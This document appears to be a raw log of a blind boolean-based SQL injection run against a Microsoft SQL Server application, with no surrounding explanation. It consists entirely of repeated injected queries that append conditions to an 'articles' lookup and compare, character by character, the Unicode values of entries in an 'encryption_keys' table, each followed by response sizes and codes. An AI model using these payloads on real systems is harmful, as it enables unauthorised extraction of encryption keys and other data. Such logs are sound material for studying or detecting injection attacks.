+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>104	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>108	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>110	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>111	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>104	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>108	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>110	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),14,1))>109	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>112	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>120	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>116	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>114	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),15,1))>115	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>96	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>48	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>1	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>24	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>36	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>42	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>45	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>43	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),16,1))>44	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>64	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>32	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>1	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>16	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>24	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>28	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>30	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),17,1))>31	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>64	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>112	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>120	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>124	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>122	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),18,1))>121	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>104	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>108	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>110	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),19,1))>111	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>112	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>120	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>116	410
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>118	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),20,1))>117	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>96	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>48	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>1	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>24	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>36	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>30	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>33	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>31	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),21,1))>32	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>64	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),22,1))>112	410
+	138
+use [master]	86
+	165
